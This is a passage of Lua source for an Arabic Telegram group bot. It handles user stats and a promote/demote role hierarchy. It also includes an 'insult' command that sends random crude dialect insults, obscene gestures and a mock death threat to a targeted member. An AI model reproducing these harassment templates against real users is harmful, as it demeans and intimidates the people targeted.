if text:match("^رسائلي اليوم$") and Abbas_Abs(msg) then local ABS_PROX = DevAbs:get(DevProx..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0 Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙رسٱئڵك ٱڵيوم ↫ *❨ "..(ABS_PROX).." ❩* ", 1, 'md') end
if text:match("^ايديي$") and Abbas_Abs(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1,'☬︙ٱيـۧډيک ↫ ❨ '..msg.sender_user_id_..' ❩', 1, 'md') end
if text:match("^رتبتي$") and Abbas_Abs(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙رتـبتک ↫ '..id_rank(msg), 1, 'html') end
if text:match("^ايدي المجموعه$") and Abbas_Abs(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱيـۧډي ٱڵمجموعة ↫ "..msg.chat_id_, 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevAbs:del(DevProx..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم حذف جميع تعديلاتك بنجٱح' , 1, 'md') end
--     Source DevProx     --
if text == "المطور" then
local DevCh1 = DevAbs:get(DevProx.."DevAbs3")
local DevText = DevAbs:get(DevProx.."DevText")
if DevCh1 then DevCh = '\n*☬ ︙ Dev Ch* ↬ ['..DevCh1..']' else DevCh = '' end
if DevText then
Dev_Abs(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '*☬ ︙ Dev User* ↬ [@'..ExDevUser..']\n*☬ ︙ Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
end
end 
--     Source DevProx     --
if text and text:match('^هينه @(.*)') and Abbas_Abs(msg) then 
local username = text:match('^هينه @(.*)') 
function ABS_PROX(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(218385683) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو غير موجود في ٱڵـمجموعة', 1, 'md') 
end 
end 
resolve_username(username,ABS_PROX)
end
--     Source DevProx     --
if text:match("^هينه$") or text:match("^بعد هينه$") or text:match("^هينه بعد$") or text:match("^لك هينه$") or text:match("^هينها$") or text:match("^هينهه$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(218385683) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
function bosha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 @'..ExDevUser, 1, 'html')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"مواححح افيـش عافيههه😍🔥💗","امممووااهحح شهلعسـل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosha)   
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 @'..ExDevUser, 1, 'html')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"مواححح افيـش عافيههه😍🔥💗","امممووااهحح شهلعسـل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
if text:match("^صيحه$") or text:match("^صيحها$") or text:match("^صيحهه$") or text:match("^صيح$") then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..ExDevUser, 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"تتعـال ححـب محتاجيـك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعـاال يريدوكك🤕♥️","تعـال لكك ديصيحـوك😐🖤"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
--     Source DevProx     --
if text and text:match('^صيحه @(.*)') and Abbas_Abs(msg) or text and text:match('^صيح @(.*)') and Abbas_Abs(msg) then 
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function ABS_PROX(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..ExDevUser, 1, 'html') 
return false  
end  
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = { "تتعـال ححـب @"..username.." محتاجيـك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعـاال يريدوكك🤕♥️","تعـال لكك @"..username.." ديصيحـوك😐🖤",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ٱڵـعضو غير موجود في ٱڵـمجموعة', 1, 'md') 
end 
end 
resolve_username(username,ABS_PROX)
end
--     Source DevProx     --
--       Set Sudo3        --
if is_sudo(msg) then
if text ==('رفع مطور ثالث') and Abbas_Abs(msg) or text ==('رفع مطور') and Abbas_Abs(msg) then
function sudo_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:sudo3:',result.sender_user_id_)
setSudo3(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور ثالث @(.*)') and Abbas_Abs(msg) or text:match('^رفع مطور @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع مطور ثالث @(.*)') or text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:sudo3:',result.id_)
setSudo3(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مطور ثالث (%d+)') and Abbas_Abs(msg) or text:match('^رفع مطور (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع مطور ثالث (%d+)') or text:match('رفع مطور (%d+)')
DevAbs:sadd(DevProx..'abs:sudo3:',user)
setSudo3(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--       Rem Sudo3        --
if text ==('تنزيل مطور ثالث') and Abbas_Abs(msg) or text ==('تنزيل مطور') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:sudo3:',result.sender_user_id_)
delSudo3(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مطور ثالث @(.*)') and Abbas_Abs(msg) or text:match('^تنزيل مطور @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل مطور ثالث @(.*)') or text:match('^تنزيل مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:sudo3:',result.id_)
delSudo3(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مطور ثالث (%d+)') and Abbas_Abs(msg) or text:match('^تنزيل مطور (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل مطور ثالث (%d+)') or text:match('تنزيل مطور (%d+)')
DevAbs:srem(DevProx..'abs:sudo3:',user)
delSudo3(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--      Set ownerall      --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير عام') and Abbas_Abs(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:ownerall:',result.sender_user_id_)
setownerall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مدير عام @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:ownerall:',result.id_)
setownerall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مدير عام (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع مدير عام (%d+)')
DevAbs:sadd(DevProx..'abs:ownerall:',user)
setownerall(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--      Rem ownerall      --
if text ==('تنزيل مدير عام') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:ownerall:',result.sender_user_id_)
delownerall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير عام @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل مدير عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:ownerall:',result.id_)
delownerall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير عام (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل مدير عام (%d+)')
DevAbs:srem(DevProx..'abs:ownerall:',user)
delownerall(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--      Set adminall      --
if is_ownerall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن عام') and Abbas_Abs(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:adminall:',result.sender_user_id_)
setadminall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع ادمن عام @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:adminall:',result.id_)
setadminall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن عام (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع ادمن عام (%d+)')
DevAbs:sadd(DevProx..'abs:adminall:',user)
setadminall(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--      Rem adminall      --
if text ==('تنزيل ادمن عام') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:adminall:',result.sender_user_id_)
deladminall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن عام @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل ادمن عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:adminall:',result.id_)
deladminall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن عام (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل ادمن عام (%d+)')
DevAbs:srem(DevProx..'abs:adminall:',user)
deladminall(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--       Set Vipall       --
if is_adminall(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز عام') and Abbas_Abs(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:vipall:',result.sender_user_id_)
setvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع مميز عام @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:vipall:',result.id_)
setvipall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز عام (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع مميز عام (%d+)')
DevAbs:sadd(DevProx..'abs:vipall:',user)
setvipall(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--       Rem Vipall       --
if text ==('تنزيل مميز عام') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:vipall:',result.sender_user_id_)
delvipall(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مميز عام @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل مميز عام @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:vipall:',result.id_)
delvipall(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مميز عام (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل مميز عام (%d+)')
DevAbs:srem(DevProx..'abs:vipall:',user)
delvipall(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--       Set Monsh        --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ اساسي') and Abbas_Abs(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
setmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ اساسي @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:monsh:'..msg.chat_id_,result.id_)
setmonsh(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ اساسي (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع منشئ اساسي (%d+)')
DevAbs:sadd(DevProx..'abs:monsh:'..msg.chat_id_,user)
setmonsh(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--       Rem Monsh        --
if text ==('تنزيل منشئ اساسي') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:monsh:'..msg.chat_id_,result.sender_user_id_)
delmonsh(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ اساسي @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل منشئ اساسي @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:monsh:'..msg.chat_id_,result.id_)
delmonsh(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ اساسي (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل منشئ اساسي (%d+)')
DevAbs:srem(DevProx..'abs:monsh:'..msg.chat_id_,user)
delmonsh(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--      Set monshid       --
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع منشئ') and Abbas_Abs(msg) then
function raf_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
setmonshid(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^رفع منشئ @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:monshid:'..msg.chat_id_,result.id_)
setmonshid(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع منشئ (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع منشئ (%d+)')
DevAbs:sadd(DevProx..'abs:monshid:'..msg.chat_id_,user)
setmonshid(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--      Rem monshid       --
if text ==('تنزيل منشئ') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.sender_user_id_)
delmonshid(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل منشئ @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل منشئ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,result.id_)
delmonshid(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل منشئ (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل منشئ (%d+)')
DevAbs:srem(DevProx..'abs:monshid:'..msg.chat_id_,user)
delmonshid(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--       Set Owner        --
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مدير') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
setowner(msg,msg.chat_id_,result.sender_user_id_)
end  
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مدير @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:owners:'..msg.chat_id_,result.id_)
setowner(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end 
if text and text:match('^رفع مدير (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع مدير (%d+)')
DevAbs:sadd(DevProx..'abs:owners:'..msg.chat_id_,user)
setowner(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--       Rem Owner        --
if text ==('تنزيل مدير') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_,result.sender_user_id_)
delowner(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل مدير @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل مدير @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_,result.id_)
delowner(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل مدير (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل مدير (%d+)')
DevAbs:srem(DevProx..'abs:owners:'..msg.chat_id_,user)
delowner(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--       Set admin        --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع ادمن') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_,result.sender_user_id_)
setadmins(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع ادمن @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_,result.id_)
setadmins(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع ادمن (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع ادمن (%d+)')
DevAbs:sadd(DevProx..'abs:admins:'..msg.chat_id_,user)
setadmins(msg,msg.chat_id_,user)
end
--     Source DevProx     --
--        Rem admin       --
if text ==('تنزيل ادمن') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_,result.sender_user_id_)
deladmins(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^تنزيل ادمن @(.*)') and Abbas_Abs(msg) then
local username = text:match('^تنزيل ادمن @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_,result.id_)
deladmins(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^تنزيل ادمن (%d+)') and Abbas_Abs(msg) then
local user = text:match('تنزيل ادمن (%d+)')
DevAbs:srem(DevProx..'abs:admins:'..msg.chat_id_,user)
deladmins(msg,msg.chat_id_,user)
end end
--     Source DevProx     --
--       Set Vipmem       --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text ==('رفع مميز') and Abbas_Abs(msg) then
function prom_reply(extra, result, success)
DevAbs:sadd(DevProx..'abs:vipmem:'..msg.chat_id_,result.sender_user_id_)
setvipmem(msg,msg.chat_id_,result.sender_user_id_)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and text:match('^رفع مميز @(.*)') and Abbas_Abs(msg) then
local username = text:match('^رفع مميز @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevAbs:sadd(DevProx..'abs:vipmem:'..msg.chat_id_,result.id_)
setvipmem(msg,msg.chat_id_,result.id_)
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙*ٱڵمعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^رفع مميز (%d+)') and Abbas_Abs(msg) then
local user = text:match('رفع مميز (%d+)')
DevAbs:sadd(DevProx..'abs:vipmem:'..msg.chat_id_,user)
setvipmem(msg,msg.chat_id_,user)
end
